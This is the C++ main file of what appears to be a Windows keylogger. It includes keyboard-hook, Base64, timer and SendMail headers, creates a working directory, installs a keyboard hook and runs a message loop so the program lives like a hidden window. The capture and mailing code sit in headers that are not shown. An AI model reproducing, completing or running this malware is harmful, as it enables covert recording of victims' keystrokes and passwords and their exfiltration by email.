#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"

using namespace std;

int main()
{

    MSG Msg;
    IO::MKDir(IO::GetOurPath(true));
    InstallHook();
    //Our main thread
    while(GetMessage(&Msg, NULL, 0, 0)){
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
        //We are translating and sending this message which will not happen.
        //Will run like a window
    }
    MailTimer.Stop();
    return 0;
}
